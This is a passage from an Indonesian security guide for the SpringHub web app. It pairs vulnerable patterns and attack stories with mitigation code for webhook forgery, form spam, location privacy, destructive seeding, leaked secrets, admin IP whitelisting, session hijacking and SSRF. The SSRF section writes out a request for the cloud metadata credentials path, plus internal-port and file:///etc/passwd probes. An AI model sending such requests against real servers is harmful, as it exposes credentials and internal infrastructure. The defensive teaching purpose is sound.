`/uploads/` dengan `autoindex off` dan header `nosniff` (BAB 9 §9.4),
sehingga file tak dikenal pun tidak dieksekusi browser sebagai HTML.

---

## 10.7 Webhook Palsu/Duplikat — Constant-Time Token + Idempotency + CAS Atomic

### Kode yang rentan (contoh nyata dari repo)

Webhook donasi Xendit tanpa verifikasi token adalah lubang emas:
siapa pun bisa mengirim `{"status": "PAID"}` dan server memberi poin.

```ts
// CONTOH POLA RENTAN — webhook tanpa token & tanpa idempotency
// const body = await request.json();
// if (body.status === "PAID") {
//   await prisma.profile.update({ where: { id: body.userId }, data: { points: { increment: 1000000 } } });
// }
// return NextResponse.json({ success: true });
```

### Cerita serangan

Penyerang membaca dokumentasi publik Xendit (format callback-nya
terdokumentasi), lalu mengirim 50 request ke
`POST https://www.springhub.id/api/donations/webhook` dengan body
`{"id": "inv_xxx", "external_id": "demo-...", "status": "PAID"}` memakai
curl. Tanpa verifikasi, server menandai donasi "lunas", memberi poin donor
(1 poin per Rp1.000), dan menaikkan `raisedAmount` proyek. Ulangi 1.000
kali: poin relawan meledak, angka donasi di landing page palsu, dan jika
ada fitur penarikan dana — uang nyata menguap. Varian kedua: Xendit sendiri
mengirim webhook duplikat (retry jaringan) → donor menerima poin 2× dan
proyek menerima `raisedAmount` 2×.

### Mitigasi di SpringHub

```ts
// app/api/donations/webhook/route.ts baris 27-44 — Token constant-time
    const expectedToken = process.env.XENDIT_WEBHOOK_TOKEN;

    if (!expectedToken) {
      if (process.env.NEXT_PUBLIC_STAGING === "true") {
        console.warn("XENDIT_WEBHOOK_TOKEN tidak diset — menerima webhook (staging log-only)");
      } else {
        console.error("XENDIT_WEBHOOK_TOKEN tidak diset — menolak webhook");
        return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
      }
    } else {
      const token = request.headers.get("x-callback-token") || "";
      const tokenHash = createHash("sha256").update(token).digest();
      const expectedHash = createHash("sha256").update(expectedToken).digest();
      if (!timingSafeEqual(tokenHash, expectedHash)) {
        console.warn("Invalid webhook callback token");
        return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
      }
    }
```

```ts
// app/api/donations/webhook/route.ts baris 69-100 — Idempotency + CAS
    // ── Idempotency check ──
    // Xendit may send duplicate webhooks. Check if already processed.
    const existing = await prisma.donation.findFirst({
      where: external_id
        ? { OR: [{ invoiceId: id || "" }, { externalId: external_id }] }
        : { invoiceId: id },
      select: { id: true, status: true, projectId: true, amountIdr: true, userId: true, donorName: true, donorEmail: true, tierId: true },
    });

    if (!existing) {
      return NextResponse.json({ error: "Donation not found" }, { status: 404 });
    }

    // If already paid, skip (idempotent)
    if (existing.status === "paid") {
      return NextResponse.json({ success: true, status: "already_processed" });
    }

    // ── Atomic compare-and-set: only one concurrent webhook wins ──
    const claimed = await prisma.$transaction(async (tx) => {
      const cas = await tx.donation.updateMany({
        where: {
          id: existing.id,
          status: localStatus === "paid" ? { not: "paid" } : "pending",
        },
        data: {
          status: localStatus as DonationStatus,
          paidAt: paid_at ? new Date(paid_at) : localStatus === "paid" ? new Date() : null,
        },
      });

      if (cas.count !== 1) return false;
```

**Cerita bagaimana mitigasi menghentikan serangan:** Request palsu penyerang
tiba. `timingSafeEqual` membandingkan hash SHA-256 token request dengan hash
token env — perbandingan berjalan dalam waktu konstan (tidak ada short-
circuit saat byte pertama beda), jadi penyerang tidak bisa menebak token
lewat *timing attack*. Token salah → `401` di baris pertama. Token tidak
diset di produksi → webhook **ditolak mentah** (fail-closed), bukan
diterima. Hanya staging yang menerima tanpa token (log-only, untuk tes).

Kalau pun token bocor, dua lapisan berikut menjaga uang: (1) **Idempotency
check** — donasi yang sudah `paid` di-skip dengan `already_processed`;
(2) **atomic compare-and-set** — `updateMany` dengan `where: { id, status: {
not: "paid" } }` berjalan di dalam transaksi; `cas.count !== 1` berarti
webhook duplikat yang datang bersamaan (race condition) KALAH — hanya satu
yang menang, sisanya dapat `already_processed`. Poin dan `raisedAmount`
di-increment tepat satu kali. Catatan log juga aman: hanya
`{ id, external_id, status }` yang dicatat — tanpa data PII donor
(keputusan sesi 1 Juli 2026: "no PII in webhook logs").

---

## 10.8 Spam Form — Honeypot + Time Gate + Rate Limit + Batas Guest

### Kode yang rentan (contoh nyata dari repo)

Form publik tanpa anti-spam akan dibanjiri bot dalam hitungan jam:

```ts
// CONTOH POLA RENTAN — form terbuka, tanpa honeypot/time gate/limit
// export async function POST(request: Request) {
//   const formData = await request.formData();
//   await prisma.report.create({ data: { fieldData: JSON.stringify(Object.fromEntries(formData)) } });
//   return NextResponse.json({ success: true });
// }
```

### Cerita serangan

Bot spam (mis. botnik yang menyewa 1.000 IP) menemukan endpoint
`POST /api/reports` dan mulai menembak 100 request/menit dari IP bergilir:
field diisi teks promosi judi online, foto diisi file kosong 1 byte. Setiap
request lolos → laporan palsu masuk antrean review admin. Dalam 3 hari,
ribuan laporan sampah: daftar review admin penuh, laporan relawan asli
tenggelam, dan (lebih buruk) laporan palsu dengan koordinat acak mulai
muncul di peta publik setelah admin yang kewalahan meng-approve massal.
Data ilmiah SpringHub — yang jadi bahan penelitian konservasi — tercemar.

### Mitigasi di SpringHub

Empat lapisan berurutan di `app/api/reports/route.ts`:

```ts
// app/api/reports/route.ts baris 14-36 — CSRF + rate limit berbasis identitas
import { apiLimiter } from "@/lib/rate-limit";
const GUEST_DAILY_LIMIT = 5; // guest only — volunteer & admin unlimited

export async function POST(request: Request) {
  try {
    // CSRF check — berlaku untuk semua client tanpa terkecuali
    const csrfToken = request.headers.get("x-csrf-token");
    if (!csrfToken || !(await verifyCsrfToken(csrfToken))) {
      return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
    }

    const session = await getSession();
    const guestId = getGuestId();
    const rateKey = session?.userId ?? guestId;

    // Rate limit check
    const limitResult = await apiLimiter.check(`report:${rateKey}`);
    if (!limitResult.allowed) {
      return NextResponse.json(
        { error: "Terlalu banyak permintaan. Silakan coba lagi nanti." },
        { status: 429 }
      );
    }
```

```ts
// app/api/reports/route.ts baris 59-80 — Time gate (<3 detik) + honeypot
    // --- Anti-spam: Time Gate ---
    // If form was submitted too fast (<3 seconds from page load), reject
    const submitTime = formData.get("_submit_time") as string;
    if (submitTime) {
      const parsedTime = parseInt(submitTime, 10);
      if (!isNaN(parsedTime)) {
        const elapsed = Date.now() - parsedTime;
        if (elapsed < 3000) {
          return NextResponse.json(
            { error: "Terlalu cepat. Silakan isi formulir dengan benar." },
            { status: 429 }
          );
        }
      }
    }

    // --- Anti-spam: Honeypot ---
    const honeypot = formData.get("_website") as string;
    if (honeypot) {
      // Bot filled the hidden field — silently accept but don't save
      return NextResponse.json({ success: true, honeypot: true });
    }
```

```ts
// app/report/[slug]/page.tsx baris 545-568 — Field honeypot tersembunyi dari manusia
        {/* Honeypot */}
        <div style={{ position: "absolute", left: "-9999px", opacity: 0, height: 0, overflow: "hidden" }} aria-hidden>
          <label htmlFor="_website">{t("form.honeypot")}</label>
          <input
            id="_website"
            name="_website"
            type="text"
            value={honeypot}
            onChange={(e) => setHoneypot(e.target.value)}
            tabIndex={-1}
            autoComplete="off"
          />
        </div>
```

```ts
// app/api/reports/route.ts baris 219-239 — Batas harian guest 5 laporan
    // Daily limit: guest max 5/hari, volunteer & admin unlimited
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);

    if (!session?.userId && guestId) {
      const todayCount = await prisma.report.count({
        where: {
          guestId: guestId,
          userId: null,
          createdAt: { gte: today, lt: tomorrow },
        },
      });
      if (todayCount >= GUEST_DAILY_LIMIT) {
        return NextResponse.json(
          { error: "Batas laporan harian (5) untuk guest tercapai. Daftar jadi volunteer untuk lapor tanpa batas!" },
          { status: 429 }
        );
      }
    }
```

**Cerita bagaimana mitigasi menghentikan serangan:** Bot menembak endpoint.
Lapisan 1 — CSRF: bot tanpa token JWT valid ditolak 403 (hanya bot yang
repot membuka halaman dulu yang bisa lanjut). Lapisan 2 — time gate:
formulir yang dikirim <3 detik setelah halaman dimuat ditolak 429; bot
yang mengirim request instan langsung tersaring (manusia butuh minimal
beberapa detik membaca form). Lapisan 3 — honeypot: field `_website`
tersembunyi dari manusia (digeser -9999px, `aria-hidden`, `tabIndex=-1`)
tapi bot yang mengisi SEMUA input akan mengisinya juga → server menerima
"sukses" PALSU tanpa menyimpan apa pun; bot tidak tahu laporannya dibuang
karena response-nya sukses. Lapisan 4 — identitas: setiap guest punya cookie
`guest_session_id` (httpOnly, 7 hari) dengan kuota **5 laporan/hari**;
volunteer yang sudah mendaftar tidak terbatas (insentif daftar). Plus
nginx `zone=report rate=1r/s` dan `apiLimiter` Redis 60/menit per identitas.
Bot dengan 1.000 IP memang bisa mengelak IP-based limit, tapi setiap IP
harus melewati CSRF + time gate + honeypot, dan laporan bot tetap harus
melewati review admin (status `pending`) sebelum tampil publik — biaya
spam jauh lebih mahal daripada manfaatnya.

---

## 10.9 Privacy Koordinat — Snap 5km ke Protection Grid

### Kode yang rentan (contoh nyata dari repo)

Pola rentan: mengirim koordinat presisi ke publik:

```ts
// CONTOH POLA RENTAN — koordinat presisi dikirim ke client publik
// return NextResponse.json({ reports: reports.map(r => ({ lat: r.preciseLat, lng: r.preciseLng })) });
```

### Cerita serangan

Seorang *spring hunter* (pemburu mata air untuk eksploitasi air tanah atau
menjual data lokasi) membuka peta SpringHub dan men-download daftar laporan
via API publik. Setiap laporan membawa `preciseLat`/`preciseLng` — koordinat
presisi meteran. Dalam satu sore, ia punya peta lengkap ratusan mata air di
Jawa Barat, lengkap dengan nama desa dan foto. Ia menjual paket data itu
ke perusahaan air kemasan yang mencari sumber air baru — atau langsung
datang ke lokasi, mengebor, dan menguras mata air yang selama bertahun-tahun
dijaga komunitas. Koordinat presisi juga membuka lokasi bagi pencuri aset
desa dan perusak situs konservasi.

### Mitigasi di SpringHub

```ts
// lib/geo.ts baris 7-47 — Grid 5km + fungsi tampilan per role
// 1° latitude ≈ 111 km. 5 km ≈ 0.045°. We use the same step for longitude;
// at Indonesia's latitudes (~-6° to -8°), the east-west distortion is < 1 %.
export const PROTECTION_GRID_DEG = 0.045; // ~5 km
export const PROTECTION_RADIUS_KM = 5;

export type LatLng = { lat: number; lng: number };

/** Snap a precise location to the centre of its 5 km protection cell. */
export function snapToProtectionGrid({ lat, lng }: LatLng): LatLng {
  return {
    lat: Math.round(lat / PROTECTION_GRID_DEG) * PROTECTION_GRID_DEG,
    lng: Math.round(lng / PROTECTION_GRID_DEG) * PROTECTION_GRID_DEG,
  };
}

/** Haversine distance in km between two points. */
export function distanceKm(a: LatLng, b: LatLng): number {
  const R = 6371;
  const toRad = (d: number) => (d * Math.PI) / 180;
  const dLat = toRad(b.lat - a.lat);
  const dLng = toRad(b.lng - a.lng);
  const sinDLat = Math.sin(dLat / 2);
  const sinDLng = Math.sin(dLng / 2);
  const h =
    sinDLat * sinDLat +
    Math.cos(toRad(a.lat)) * Math.cos(toRad(b.lat)) * sinDLng * sinDLng;
  return 2 * R * Math.asin(Math.sqrt(h));
}

/**
 * Choose what to display based on the viewer's clearance.
 * - "public" / "volunteer": always snapped
 * - "admin": precise coords
 */
export function visibleLocation(
  precise: LatLng,
  role: "public" | "volunteer" | "admin"
): LatLng {
  if (role === "admin") return precise;
  return snapToProtectionGrid(precise);
}
```

```ts
// app/api/reports/route.ts baris 138-151 — Snap DILAKUKAN DI SERVER saat simpan
    // Snap location to 5km protection grid (hanya untuk form yang terkait spring)
    let snappedLat: number | null = null;
    let snappedLng: number | null = null;
    const protectForm = formSlug === "spring-monitoring" || formSlug === "spring-restoration";
    if (preciseLat !== null && preciseLng !== null) {
      if (protectForm) {
        const snapped = snapToProtectionGrid({ lat: preciseLat, lng: preciseLng });
        snappedLat = snapped.lat;
        snappedLng = snapped.lng;
      } else {
        snappedLat = preciseLat;
        snappedLng = preciseLng;
      }
    }
```

```ts
// app/api/reports/route.ts baris 443-455 — API publik HANYA mengirim snapped
        select: {
          id: true,
          formSlug: true,
          status: true,
          snappedLat: true,
          snappedLng: true,
          springId: true,
          createdAt: true,
          featuredPhotoId: true,
          photos: {
            select: { id: true, storagePath: true },
            take: 1,
            orderBy: { createdAt: "desc" },
          },
          user: {
            select: { username: true, region: true },
          },
        },
```

**Cerita bagaimana mitigasi menghentikan serangan:** Pemburu mata air itu
men-download daftar laporan — dan hanya menemukan `snappedLat`/`snappedLng`.
`preciseLat`/`preciseLng` memang disimpan (untuk admin), tapi **tidak pernah
dipilih** di query publik: `select` hanya memuat `snappedLat/snappedLng`.
Nilai snapped dihitung server-side saat laporan dibuat:
`Math.round(lat / 0.045) * 0.045` — semua mata air dalam sel ~5km
terlihat di koordinat PUSAT SEL yang sama. Dua mata air berjarak 2 km
tampak identik di peta publik; pemburu tidak bisa membedakan lokasi mana
yang mana — akurasi publik ±2,5 km dari titik sebenarnya, terlalu kasar
untuk dieksploitasi tapi cukup untuk menampilkan distribusi konservasi.
`visibleLocation()` menegaskan aturan: hanya role `admin` yang mendapat
koordinat presisi; volunteer pun hanya melihat snapped (kebijakan privacy
diputuskan di sesi 15 Mei 2026: "RLS-first, data sensitif tidak pernah
dikirim ke frontend"). Foto yang di-upload pun sudah di-strip EXIF-nya
(§10.6) — tidak ada GPS tersembunyi di metadata gambar.

---

## 10.10 Seed Destruktif — Pengaman DB Kosong + `SEED_FORCE`

### Kode yang rentan (contoh nyata dari repo)

`prisma/seed.ts` secara alami destruktif — ini TEMUAN KRITIS sesi 12
Agustus 2026: versi lama menjalankan `deleteMany` seluruh tabel tanpa
pengaman apa pun:

```ts
// prisma/seed.ts — VERSI LAMA (sebelum pengaman): hapus SEMUA data tanpa bertanya
// await prisma.trackingPoint.deleteMany();
// await prisma.offlineSession.deleteMany();
// await prisma.comment.deleteMany();
// ...
// await prisma.profile.deleteMany();
// console.log("   ✅ Cleaned existing data\n");
```

### Cerita serangan

Ini bukan serangan dari luar, tapi *self-inflicted wound* yang sama
mematikannya: seorang developer (atau pipeline CI yang salah konfigurasi)
menjalankan `npx prisma db seed` — atau `prisma migrate reset` yang memicu
seed — terhadap database produksi yang berisi 2 tahun data lapangan
masyarakat. Tanpa pengaman, 16 tabel dihapus berantai: profil pengguna,
laporan, poin, donasi, proyek, kursus. Backup terakhir? Jam 3 pagi tadi —
12 jam data hilang. Yang lebih buruk: perintah ini bisa masuk cron/script
deploy secara tidak sengaja dan "sukses" tanpa satu pun peringatan.

### Mitigasi di SpringHub

```ts
// prisma/seed.ts baris 19-44 — Pengaman: hanya jalan di DB kosong, atau SEED_FORCE
// ─── Pengaman: JANGAN pernah hapus data tanpa sengaja ──────────────────────
// Seed ini MENGHAPUS semua data (deleteMany) lalu menanam data demo.
// Default: hanya jalan di database kosong. Untuk memaksa (mis. staging/dev
// yang memang kosong), set SEED_FORCE=1 atau SEED_ALLOW_WIPE=true.
async function assertSafeToWipe() {
  const existing = await prisma.profile.count();
  if (existing === 0) return;
  const force =
    process.env.SEED_FORCE === "1" || process.env.SEED_ALLOW_WIPE === "true";
  if (force) {
    console.warn(
      `⚠️  SEED_FORCE aktif — ${existing} profil akan DIHAPUS dan diganti data demo.`
    );
    return;
  }
  console.error(
    `🛑 DIHENTIKAN: database tidak kosong (${existing} profil ditemukan).\n` +
      `Seed ini MENGHAPUS SEMUA data. Jalankan hanya di database kosong,\n` +
      `atau set SEED_FORCE=1 bila benar-benar yakin.`
  );
  process.exit(1);
}

async function main() {
  console.log("🌱 Seeding SpringHub database...\n");
  await assertSafeToWipe();
```

**Cerita bagaimana mitigasi menghentikan serangan:** Developer menjalankan
`npx prisma db seed` di mesin yang DATABASE_URL-nya menunjuk produksi.
`assertSafeToWipe()` mengecek `prisma.profile.count()` — produksi punya
ratusan profil → hitung bukan nol → skrip mencetak pesan merah
"DIHENTIKAN: database tidak kosong..." lalu `process.exit(1)` **sebelum
satu pun `deleteMany` dieksekusi**. Satu-satunya jalan untuk wipe: database
benar-benar kosong (fresh install) ATAU env `SEED_FORCE=1` yang eksplisit
dan sadar risiko (dengan peringatan keras di console). Aturan operasional
yang menyertainya (AGENTS.md): "Jangan pernah `db seed` ke DB berisi!"
dan seed ke staging dilarang — data staging di-restore dari backup
produksi, bukan di-seed.

---

## 10.11 Secret Bocor ke Repo — .gitignore + Kebersihan Git History

### Kode yang rentan (contoh nyata dari repo)

Pola yang menghantui banyak proyek: `.env` atau file kredensial ikut
ter-commit. Di SpringHub, `.gitignore` adalah garis pertahanan pertama:

```gitignore
# .gitignore — baris 26-32, 63-83
# local env files
.env
.env.local
.env.development.local
.env.test.local
.env.production.local
.env.production

# credentials
*credentials*
*credential*

# opencode chat history (contains API keys in conversations)
.opencode/history/
.opencode/opencode.json

# backup files (contains API keys & SSH keys in copies)
backup/

# local temp files
MANUAL-TEST-PART-2*.md
*.csv
*.pdf
baca.*.txt
.env.staging
scripts/htpasswd-staging
scripts/htpasswd-preview
playwright-report/
k6/
```

### Cerita serangan

Konteks nyata proyek ini: file backup berisi kunci API (history chat
opencode menyimpan kunci dalam percakapan; folder `backup/` berisi salinan
file dengan SSH keys; `.playwright-mcp/` menyimpan log console yang bisa
memuat token). Jika salah satu lolos ke GitHub publik: penyerang memindai
GitHub (tools seperti trufflehog/gitleaks memindai jutaan repo) dan
menemukan `XENDIT_SECRET_KEY` atau `RESEND_API_KEY` dalam hitungan menit.
Dampak: kirim email phishing dari domain springhub.id (merusak reputasi),
membaca/membuat invoice donasi, atau memakai SMTP relay untuk spam.

### Mitigasi di SpringHub

```gitignore
# .gitignore — baris 63-71 (lapisan kedua untuk artefak lokal)
# e2e
test-results/
e2e-report/

# vercel
.vercel

# playwright-mcp
.playwright-mcp/

# credentials
*credentials*
*credential*

# opencode chat history (contains API keys in conversations)
.opencode/history/
.opencode/opencode.json

# backup files (contains API keys & SSH keys in copies)
backup/
```

**Cerita bagaimana mitigasi menghentikan serangan:** Pola `*.env*` dan
`.env.production` memastikan file kredensial tidak pernah masuk staging
area sejak awal — termasuk `.env.staging` dan htpasswd (kredensial Basic
Auth). Pola `*credentials*`/`*credential*` menangkap file bernama apa pun
yang mengandung kata "credential" — tanpa peduli folder. `backup/` dan
`.opencode/history/` di-ignore karena riwayat chat nyata pernah memuat
kunci API di dalam percakapan (catatan di komentar file). Audit sesi 12
Agustus 2026 menegaskan: scan secret bersih — hanya kredensial demo e2e/k6
yang sengaja ada; `playwright-report/` dan `k6/` ditambahkan ke .gitignore;
file sampah (`10s`, `Postgres`) dihapus dari repo. Sebagai lapisan
terakhir, `.env.example` memuat placeholder (`[YOUR-PASSWORD]`) bukan nilai
asli, dan CI menjalankan `tsc`+`vitest` (bukan publish) sehingga nilai
env produksi tidak pernah dibutuhkan di runner GitHub.

---

## 10.12 IP Whitelist Admin — Fail-Closed di Middleware + API

### Kode yang rentan (contoh nyata dari repo)

Pola rentan: whitelist yang "lupa" menolak IP tak dikenal (fail-open), atau
guard admin yang hanya di UI:

```ts
// CONTOH POLA RENTAN — fail-open: IP tidak dikenal TETAP DITERIMA
// const allowed = ["192.168.1.0/24"];
// if (allowed.includes(ip)) { /* lanjut */ }   // ← selain itu? tidak ditolak!
```

### Cerita serangan

Akun admin SpringHub adalah harta karun: bisa approve laporan, mengubah
konten kursus, melihat koordinat presisi SEMUA mata air, dan membaca semua
donasi. Penyerang yang berhasil mencuri cookie session admin (via XSS
atau malware di laptop admin) mencoba mengakses `/admin` dari IP-nya di
Jakarta. Dengan whitelist fail-open, request lolos — penyerang duduk di
dashboard admin: mengubah titik mata air di peta, menghapus laporan,
mencuri daftar donor (nama, email, nominal), dan memasang konten kursus
berisi skrip jahat untuk relawan berikutnya.

### Mitigasi di SpringHub

```ts
// middleware.ts baris 47-51 & 92-107 — Fail-closed: IP tak dikenal → DENY
// Fail-closed: whitelist diset tapi IP tidak valid/tidak terdeteksi → DENY.
function isAllowedIp(ip: string, ranges: string[]): boolean {
  if (ip === "" || ipv4ToInt(ip) === null) return false;
  return ranges.some((range) => isIpInCidr(ip, range));
}

export async function middleware(request: NextRequest) {
  ...
  if (pathname.startsWith("/admin")) {
    if (!session || session.role !== "admin") {
      const url = new URL("/sign-in", request.url);
      url.searchParams.set("redirect", pathname);
      return NextResponse.redirect(url);
    }

    // IP whitelist untuk admin (optional)
    const allowedCidrs = process.env.ADMIN_ALLOWED_IPS;
    if (allowedCidrs) {
      const ranges = allowedCidrs.split(",").map(s => s.trim()).filter(Boolean);
      if (ranges.length > 0 && !isAllowedIp(getClientIp(request), ranges)) {
        return new NextResponse("Access denied: IP not allowed", { status: 403 });
      }
    }
  }
```

```ts
// lib/auth.ts baris 144-155 — Whitelist yang sama tersedia untuk API route
export function isAdminIpAllowed(request: Request): boolean {
  const allowedCidrs = process.env.ADMIN_ALLOWED_IPS;
  if (!allowedCidrs) return true; // Tidak ada whitelist → izinkan semua

  const ranges = allowedCidrs.split(",").map(s => s.trim()).filter(Boolean);
  if (ranges.length === 0) return true;

  const ip = getClientIp(request);
  if (ip === "unknown" || ipv4ToInt(ip) === null) return false; // fail-closed

  return ranges.some(range => isIpInCidr(ip, range));
}
```

```ts
// lib/auth.ts baris 20-23 — isAdmin() helper untuk setiap route handler
export async function isAdmin(): Promise<boolean> {
  const session = await getSession();
  return session?.role === "admin";
}
```

**Cerita bagaimana mitigasi menghentikan serangan:** Penyerang dengan cookie
admin curian membuka `/admin` dari IP asing. Middleware memeriksa dua hal
berurutan: role JWT harus `admin` (redirect ke sign-in jika bukan), lalu
`ADMIN_ALLOWED_IPS` (jika env diset): IP penyerang tidak cocok dengan CIDR
mana pun → `403 Access denied: IP not allowed` di EDGE — halaman admin
tidak pernah dirender. Perhatikan fail-closed ganda: `isAllowedIp` menolak
string kosong/IP tidak valid (`ip === "" || ipv4ToInt(ip) === null →
false`), dan middleware menolak jika `ranges.length > 0` tapi IP tidak
cocok. Artinya: kalau env diset, TIDAK ADA jalan "lolos karena tidak
terdeteksi". Lapisan kedua: setiap API route admin wajib `isAdmin()` +
`auditLog()` (pola API route di AGENTS.md) — penyerang yang memanggil API
langsung (melewati middleware) tetap ditolak di handler, dan setiap aksi
tercatat di tabel audit. `getClientIp` hanya percaya `x-real-ip` dari
nginx (yang sudah memakai Cloudflare real-IP, BAB 9 §9.4.3) — penyerang
tidak bisa memalsukan IP lewat header.

---

## 10.13 Session Hijack — Cookie Flags + Ledger + Rotasi

### Kode yang rentan (contoh nyata dari repo)

Pola rentan: cookie session tanpa `httpOnly`/`secure`/`SameSite` dan tanpa
cara mencabut sesi:

```ts
// CONTOH POLA RENTAN — cookie bisa dibaca JS, dikirim HTTP, dan tidak bisa dicabut
// res.setHeader("Set-Cookie", `session=${token}; Path=/; Max-Age=604800`);
```

### Cerita serangan

Penyerang menemukan XSS kecil di halaman FAQ (contoh 10.2) atau
menyadap WiFi publik di warung kopi tempat relawan membuka SpringHub via
HTTP (tanpa `secure`, cookie ikut dalam request HTTP). Ia mencuri nilai
cookie `session` — lalu memakai token itu dari laptopnya. Yang lebih licik:
penyerang memakai token itu di WAKTU YANG SAMA dengan korban (session
hijacking paralel) — korban tidak menyadari apa pun, dan tidak ada cara
bagi admin untuk "memutus" pencuri karena sesi tidak punya pencatatan.

### Mitigasi di SpringHub

```ts
// lib/auth.ts baris 40-75 — Cookie httpOnly+secure+SameSite + session ledger
export async function createSession(payload: SessionPayload, isSecure?: boolean): Promise<string> {
  if (!payload || typeof payload !== "object") {
    throw new Error("Invalid session payload");
  }
  const jwtPayload: JWTPayload = {
    userId: payload.userId,
    role: payload.role,
    username: payload.username,
    phone: payload.phone || "",
  };
  const token = await new SignJWT(jwtPayload)
    .setProtectedHeader({ alg: "HS256" })
    .setExpirationTime(`${SESSION_DURATION_SEC}s`)
    .sign(SECRET);

  // Session ledger: row must exist and be unexpired for the JWT to be accepted.
  // Store only the SHA-256 hash of the token in the database.
  await prisma.session.create({
    data: {
      profileId: payload.userId,
      token: sha256Hex(token),
      expiresAt: new Date(Date.now() + SESSION_DURATION_SEC * 1000),
    },
  });

  const cookieStore = cookies();
  cookieStore.set(SESSION_COOKIE, token, {
    httpOnly: true,
    secure: isSecure ?? true,
    sameSite: "lax",
    maxAge: SESSION_DURATION_SEC,
    path: "/",
  });

  return token;
}
```

```ts
// lib/auth.ts baris 157-191 — Verifikasi: JWT valid DAN ledger aktif
export async function getSession(): Promise<SessionPayload | null> {
  const cookieStore = cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;

  try {
    // Coba verifikasi dengan current + previous key (rotasi support)
    const result = await verifyJwtWithRotation<JWTPayload>(token, (secret) =>
      jwtVerify(token, secret).then((r) => r.payload)
    );

    if (!result) return null;
    const payload = result.payload;

    if (!payload || typeof payload !== "object") return null;
    const p = payload as Record<string, unknown>;
    if (
      typeof p.userId !== "string" ||
      typeof p.role !== "string" ||
      typeof p.username !== "string"
    ) {
      return null;
    }

    // Revocation ledger: token hash must have an active, unexpired Session row.
    const row = await prisma.session.findUnique({
      where: { token: sha256Hex(token) },
      select: { expiresAt: true },
    });
    if (!row || row.expiresAt.getTime() < Date.now()) return null;

    return { userId: p.userId, role: p.role, username: p.username, phone: (p.phone as string) || "" };
  } catch {
    return null;
  }
}
```

```ts
// lib/session-cache.ts baris 22-66 — Cache sesi PWA hanya fallback tampilan
export async function fetchAndCacheSession(): Promise<{
  user: { id: string; username: string; role: string; phone?: string; points?: number } | null;
  fromCache: boolean;
}> {
  // 1. Coba dari API dulu
  try {
    const res = await fetch("/api/auth/me");
    if (res.ok) {
      const data = await res.json();
      if (data.user) {
        // Ambil CSRF token untuk PWA offline fallback
        let csrfToken = "";
        try {
          const csrfRes = await fetch("/api/csrf");
          if (csrfRes.ok) {
            const csrfData = await csrfRes.json();
            csrfToken = csrfData.token || "";
          }
        } catch {
          // Non-critical
        }

        // Cache ke IndexedDB untuk PWA offline fallback
        const session: CachedSession = {
          id: "user-session",
          userId: data.user.id || data.user.email,
          username: data.user.username || "User",
          role: data.user.role || "volunteer",
          phone: data.user.phone || "",
          csrfToken,
          cachedAt: Date.now(),
        };
        try {
          await offlineDB.saveSession(session);
        } catch {
          // Non-critical — session tetap work walau gagal cache
        }
        return { user: data.user, fromCache: false };
      }
    }
  } catch {
    // API gagal (offline) — lanjut ke cache
  }

  // 2. Fallback: coba dari IndexedDB
  try {
    const cached = await offlineDB.getSession();
    if (cached && Date.now() - cached.cachedAt < SESSION_MAX_AGE_MS) {
      return {
        user: {
          id: cached.userId,
          username: cached.username,
          role: cached.role,
          phone: cached.phone,
        },
        fromCache: true,
      };
    }
  } catch {
    // IndexedDB tidak tersedia
  }

  return { user: null, fromCache: false };
}
```

**Cerita bagaimana mitigasi menghentikan serangan:** Cookie `session`
dipasang dengan `httpOnly: true` (JavaScript tidak bisa membacanya — XSS
10.2 tidak bisa mencuri token), `secure: true` (hanya dikirim lewat HTTPS
— tidak bocor di WiFi HTTP), `sameSite: "lax"` (form lintas-situs tidak
membawa cookie — menetralkan sebagian CSRF), `maxAge` 7 hari. Token yang
disimpan di DB hanyalah **hash SHA-256** — bocornya database tidak
membocorkan token yang bisa dipakai. Setiap verifikasi `getSession()`
mengecek dua hal: JWT valid secara kriptografis DAN ada baris `Session`
aktif dengan `expiresAt` masa depan. Penyerang yang mencuri token dari
WiFi: token itu lolos JWT, tapi jika admin (atau sistem) menjalankan
`deactivateUserSessions(userId)` — misalnya setelah korban melaporkan
"ada yang masuk ke akun saya" — semua baris Session user itu di-set
`expiresAt = epoch 0`; token pencuri kini TIDAK punya ledger aktif →
`getSession()` mengembalikan `null` → pencuri terlempar, korban tinggal
login ulang. Cache IndexedDB PWA (`lib/session-cache.ts`) hanya fallback
TAMPILAN untuk mode offline — tidak pernah menggantikan verifikasi server;
`clearCachedSession()` dipanggil saat logout agar data sesi tidak
tertinggal di perangkat bersama.

---

## 10.14 SSRF / Proxy Gambar — Whitelist Format di `app/api/ytthumb`

### Kode yang rentan (contoh nyata dari repo)

Pola proxy URL bebas adalah SSRF klasik:

```ts
// CONTOH POLA RENTAN — proxy menerima URL arbitrer dari user
// const url = searchParams.get("url");
// const res = await fetch(url);  // ← bisa menembak 169.254.169.254 (metadata AWS)!
// return new NextResponse(await res.arrayBuffer(), { status: 200 });
```

### Cerita serangan

SpringHub punya endpoint `GET /api/ytthumb?videoId=...&quality=...` untuk
mengambil thumbnail YouTube (dipakai media section). Jika endpoint ini
menerima URL bebas, penyerang memanggil:

```text
GET /api/ytthumb?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Server VPS (atau cloud provider mana pun) meneruskan request ke alamat
metadata internal, dan response-nya (kredensial IAM sementara!) diteruskan
ke penyerang. Varian lain: `http://127.0.0.1:5432` untuk probing database
internal, `http://staging-postgres:5432` untuk memetakan jaringan Docker,
atau `file:///etc/passwd` jika fetch mendukung skema file. Satu endpoint
proxy yang lalai = peta lengkap infrastruktur internal + potensi kredensial.

### Mitigasi di SpringHub

```ts
// app/api/ytthumb/route.ts baris 5-43 — URL dikonstruksi server dari input terbatas
const SIZES = ["maxresdefault", "hqdefault", "mqdefault", "sddefault"];

export async function GET(request: Request) {
  const url = new URL(request.url);
  const videoId = url.searchParams.get("videoId");
  const quality = url.searchParams.get("quality") || "hqdefault";

  if (!videoId || !/^[a-zA-Z0-9_-]{11}$/.test(videoId)) {
    return new NextResponse(null, { status: 400 });
  }

  const preferred = SIZES.includes(quality) ? quality : "hqdefault";
  const tryOrder = [preferred, ...SIZES.filter(s => s !== preferred)];

  for (const size of tryOrder) {
    try {
      const imgUrl = `https://i.ytimg.com/vi/${videoId}/${size}.jpg`;
      const controller = new AbortController();
      const t = setTimeout(() => controller.abort(), 5000);
